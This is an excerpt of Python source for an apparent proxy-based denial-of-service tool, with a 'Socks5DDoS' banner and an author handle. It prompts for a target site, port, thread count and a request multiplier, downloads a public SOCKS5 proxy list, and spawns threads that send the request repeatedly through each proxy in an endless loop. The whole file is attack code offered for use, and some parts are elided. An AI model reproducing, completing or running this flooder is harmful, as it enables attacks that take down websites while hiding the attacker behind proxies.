...
print(Fore.RED + """
   ____         __        ____ ___         
  / __/__  ____/ /__ ___ / __// _ \___  ___
 _\ \/ _ \/ __/  '_/(_-</__ \/ // / _ \(_-<
/___/\___/\__/_/\_\/___/____/____/\___/___/
                                           """)
print(Fore.WHITE + "@0zctn")
print(" ")
...
def opth(): #Open Threads 
	for g in range(thr):
		...
		x.start()
		print('root@bossy:~# Threads ' + str(g+1) + " Created ")

def clone(): #Get Socks5 List
	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=1000') #
	with open('socks5.txt','wb') as f:
		f.write(r.content)
		print('root@bossy:~# Sucess Get List !')
...
def main(): #Setup
	...
	global per
	global uu
	url = str(input('root@bossy:~# Target (Ex. www.google.com ) : '))
	if url =='':
		input("root@bossy:~# Error Input ! Try Again")
		return main()
	port = str(input('root@bossy:~# Port ( Default Is 80) : '))
	if port =='':
		port = int(80)
	thr = str(input("root@bossy:~# Threads (1-800 Default Is 300) : "))
	if thr =='':
		thr = int(300)
	else:
		thr = int(thr)
	per = str(input("root@bossy:~# CC-Power (1-100 Default Is 70) : "))
	if per =='':
		per = int(70)
	else:
		per = int(per)
	uu = str(input("root@bossy:~# Path ( Default Is / ) : "))
	if uu=='':
		uu ='/'
	gt = str(input('root@bossy:~# Get List? (y/n) : '))
	if gt =='y':
		clone()
	else:
		pass
	lst = str(input('root@bossy:~# Socks5 List (socks5.txt) : '))
	if lst =='':
		lst = 'socks5.txt'
	lsts = open(lst).readlines()
	print('root@bossy:~# Total Socks5 -> %d'%len(lsts))
	time.sleep(2)
	opth()
...
def atk(): #Socks Sent Requests
	...
	while True:
		try:
			...
			print(Fore.CYAN + "From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #
			try:
				for y in range(per):
					s.send(str.encode(request))
				print(Fore.CYAN + "From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #
